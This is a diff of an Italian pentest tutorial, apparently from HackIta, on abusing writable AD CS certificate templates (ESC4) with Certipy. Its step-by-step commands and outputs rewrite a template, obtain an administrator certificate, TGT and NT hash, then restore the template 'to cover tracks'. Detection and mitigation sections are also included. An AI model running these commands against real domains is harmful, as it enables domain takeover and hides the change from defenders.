@@ -16,106 +16,309 @@ tags:
   - certipy
 ---
 
-ESC4 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** basata sull'abuso delle **ACL dei certificate template**.
+ESC4 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che consiste nel **modificare direttamente un certificate template in Active Directory**.
 
-Se un attaccante possiede permessi di scrittura su un template Active Directory (WriteDACL, WriteOwner, GenericAll o simili), può modificarne completamente la configurazione e **trasformarlo in un template vulnerabile a ESC1**.
+I certificate template sono oggetti AD salvati in:
 
-In questa guida vediamo **come sfruttare ESC4 ADCS con Certipy passo dopo passo**, modificando un template sicuro, ottenendo un certificato come **Administrator** e autenticandosi tramite **Kerberos PKINIT**.
-
-## Quando ESC4 ADCS È Sfruttabile
-
-* L'attaccante ha **permessi di scrittura** sull'oggetto template AD: WriteDACL, WriteOwner, WriteProperty, GenericAll, o FullControl
-* Gruppi ampi come Authenticated Users o Domain Users hanno uno di questi permessi (Certipy lo segnala automaticamente)
-
-***
-
-## Exploit ESC4 ADCS Con Certipy
-
-### Step 1 — Enumera i template con ACL deboli
-
-```bash
-certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
+```
+CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration
 ```
 
-### Step 2 — Sovrascrivi il template (salva backup automatico)
+Se un attaccante ottiene **permessi di scrittura sul template**, può modificarlo e trasformarlo in un template vulnerabile (tipicamente **ESC1**).
 
-```bash
-certipy template -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -template 'SecureFiles' -write-default-configuration
+***
+
+# Quando esiste ESC4
+
+ESC4 esiste quando un utente ha permessi sul template come:
+
+```
+WriteDACL
+WriteOwner
+WriteProperty
+FullControl
 ```
 
-Questo comando: abilita EnrolleeSuppliesSubject, aggiunge EKU Client Authentication, concede enrollment ad Authenticated Users, disabilita manager approval, imposta authorized signatures a 0. La configurazione originale viene salvata in `SecureFiles.json`.
+Questo permette di modificare attributi critici come:
 
-### Step 3 — Sfrutta come ESC1
-
-```bash
-certipy req -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -target CA.CORP.LOCAL -ca 'CORP-CA' -template 'SecureFiles' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+```
+msPKI-Certificate-Name-Flag
+pKIExtendedKeyUsage
+msPKI-Enrollment-Flag
+nTSecurityDescriptor
 ```
 
-### Step 4 — Autenticati
+***
 
-```bash
-certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.0.100
+# Cosa può fare l’attaccante
+
+Con questi permessi può:
+
+```
+abilitare Enrollee Supplies Subject
+aggiungere Client Authentication EKU
+dare enrollment a Domain Users
+disabilitare Manager Approval
 ```
 
-### Step 5 — Ripristina il template originale
+In pratica trasforma il template in **ESC1**.
+
+***
+
+# Identificazione con Certipy
+
+Enumerazione template:
 
 ```bash
-certipy template -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -template 'SecureFiles' -write-configuration 'SecureFiles.json' -no-save
+certipy find -u attacker@corp.local -p 'Passw0rd!'
 ```
 
-Il ripristino è fondamentale per ridurre l'impatto durante un pentest.
+Output tipico:
+
+```
+Template Name : SecureFiles
+
+Object Control Permissions
+Full Control Principals : Authenticated Users
+
+[!] Vulnerabilities
+ESC4 : User has dangerous permissions
+```
+
+Indicatori chiave:
+
+```
+User ACL Principals
+WriteDACL
+WriteOwner
+FullControl
+```
 
 ***
 
-## Output Dell'Attacco ESC4
+# Exploitation ESC4
 
-* Template sicuro → convertito a ESC1
-* **TGT + NT hash** come Administrator
-* Il template originale può essere ripristinato dal file JSON di backup
+L’attacco avviene in **tre fasi**.
 
-***
-
-## Detection ESC4 ADCS
-
-* **Event ID 4899** — template aggiornato
-* **Event ID 4900** — permessi di sicurezza del template modificati
-* **Event ID 5136** — modifica oggetto directory service (cambio attributi template)
+1️⃣ modificare template
+2️⃣ ottenere certificato admin
+3️⃣ autenticarsi
 
 ***
 
-## Mitigation ESC4 ADCS
+# Step 1 — modificare il template
 
-* Audita le ACL su tutti gli oggetti template: solo Enterprise Admins e Domain Admins devono avere permessi di scrittura
-* Rimuovi permessi WriteDACL/WriteOwner/GenericAll da gruppi ampi
-* Monitora le modifiche ai template con gli Event ID sopra indicati
+Certipy può trasformare automaticamente il template in uno **ESC1 vulnerable**.
+
+```bash
+certipy template \
+-u attacker@corp.local -p 'Passw0rd!' \
+-dc-ip 10.0.0.100 \
+-template SecureFiles \
+-write-default-configuration
+```
+
+Questo comando modifica il template e:
+
+```
+abilita Enrollee Supplies Subject
+aggiunge Client Authentication
+dà enrollment a Authenticated Users
+rimuove manager approval
+```
+
+Backup automatico:
+
+```
+SecureFiles.json
+```
 
 ***
 
-## FAQ — ESC4 ADCS
+# Step 2 — richiedere certificato Administrator
 
-### Cos'è ESC4 in ADCS?
+Ora il template è vulnerabile.
 
-ESC4 è l'abuso delle ACL deboli sugli oggetti template in Active Directory. Se un utente può scrivere su un template, può trasformarlo in un template vulnerabile a ESC1 e richiedere certificati come Domain Admin.
+```bash
+certipy req \
+-u attacker@corp.local -p 'Passw0rd!' \
+-dc-ip 10.0.0.100 \
+-target CA.CORP.LOCAL \
+-ca CORP-CA \
+-template SecureFiles \
+-upn administrator@corp.local \
+-sid S-1-5-21-...-500
+```
 
-### Come sfruttare ESC4 con Certipy?
+Output:
 
-Un comando `certipy template -write-default-configuration` riscrive il template rendendolo vulnerabile a ESC1. Poi si sfrutta normalmente con `certipy req -upn administrator@corp.local`.
-
-### Qual è la differenza tra ESC4 e ESC1?
-
-[ESC1](https://hackita.it/articoli/esc1-adcs) sfrutta un template già vulnerabile. ESC4 crea la vulnerabilità modificando le ACL di un template sicuro. Il risultato finale è identico.
-
-### ESC4 è rilevabile?
-
-Sì. Le modifiche ai template generano Event ID specifici (4899, 4900, 5136). È una delle tecniche ADCS più rumorose.
+```
+Successfully requested certificate
+Saving certificate to administrator.pfx
+```
 
 ***
 
-**Key Takeaway:** Se hai permessi di scrittura su un template, puoi trasformarlo in ESC1 con un singolo comando Certipy — e ripristinarlo dopo.
+# Step 3 — autenticarsi
 
-> ESC4 dimostra come **ACL deboli sui certificate template** possano trasformare un template sicuro in un vettore di privilege escalation. Per la panoramica completa degli attacchi certificate-based leggi la guida: [ADCS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16).\
-> Continua con le tecniche successive: [ESC5 ADCS](https://hackita.it/articoli/esc5-adcs) · [ESC6 ADCS](https://hackita.it/articoli/esc6-adcs).Se questo contenuto ti è utile puoi **supportare HackIta** su [Supporta](https://hackita.it/supporto).\
-> Vuoi imparare **pentesting Active Directory e offensive security 1:1** oppure **testare la sicurezza del tuo sito o della tua infrastruttura aziendale**? Vai su [Servizi HackIta](https://hackita.it/servizi).Riferimenti tecnici:\
-> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)\
-> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)\
-> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
+```bash
+certipy auth \
+-pfx administrator.pfx \
+-dc-ip 10.0.0.100
+```
+
+Output:
+
+```
+Got TGT
+Got NT hash for administrator
+```
+
+Accesso ottenuto:
+
+```
+Domain Admin
+```
+
+***
+
+# Step 4 — ripristinare template (opzionale)
+
+Per coprire le tracce.
+
+```bash
+certipy template \
+-u attacker@corp.local -p 'Passw0rd!' \
+-dc-ip 10.0.0.100 \
+-template SecureFiles \
+-write-configuration SecureFiles.json \
+-no-save
+```
+
+Il template torna allo stato originale.
+
+***
+
+# Perché ESC4 è potente
+
+Perché permette di **creare nuove vulnerabilità AD CS**.
+
+L’attaccante può trasformare un template sicuro in:
+
+```
+ESC1
+ESC2
+ESC3
+```
+
+***
+
+# Limite importante
+
+ESC4 funziona **solo se il template è già pubblicato sulla CA**.
+
+Se non è pubblicato serve:
+
+```
+ESC7
+```
+
+(per abilitarlo sulla CA).
+
+***
+
+# Detection ESC4
+
+Indicatori principali:
+
+```
+WriteDACL
+WriteOwner
+FullControl
+WriteProperty
+```
+
+su template.
+
+Audit:
+
+```bash
+certipy find
+```
+
+oppure con BloodHound.
+
+***
+
+# Mitigation ESC4
+
+### Limitare ACL template
+
+Solo gruppi amministrativi devono avere permessi:
+
+```
+Enterprise Admins
+PKI Admins
+```
+
+***
+
+### Audit periodico template
+
+Controllare ACL su:
+
+```
+CN=Certificate Templates
+```
+
+***
+
+### Usare tool di auditing
+
+Utili:
+
+```
+BloodHound
+PingCastle
+Certipy
+```
+
+***
+
+### Disabilitare template inutilizzati
+
+Molti template legacy non servono.
+
+***
+
+# FAQ — ESC4 ADCS
+
+### Cos'è ESC4?
+
+Un attacco che sfrutta **permessi di scrittura su un certificate template**.
+
+### Cosa permette?
+
+Modificare il template e renderlo vulnerabile.
+
+### ESC4 porta a Domain Admin?
+
+Sì, trasformando il template in **ESC1**.
+
+### ESC4 modifica la CA?
+
+No. Modifica **solo il template in Active Directory**.
+
+***
+
+**Key Takeaway:** se un utente può modificare un certificate template in AD, può trasformarlo in un template vulnerabile e ottenere certificati per qualsiasi utente del dominio.
+
+***
+
+> Guida completa AD CS escalation:
+> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con:
+> [https://hackita.it/articoli/esc5-adcs](https://hackita.it/articoli/esc5-adcs) · [https://hackita.it/articoli/esc6-adcs](https://hackita.it/articoli/esc6-adcs)Supporta HackIta:
+> [https://hackita.it/supporto](https://hackita.it/supporto)Pentest Active Directory o formazione offensiva:
+> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
+> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
+> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
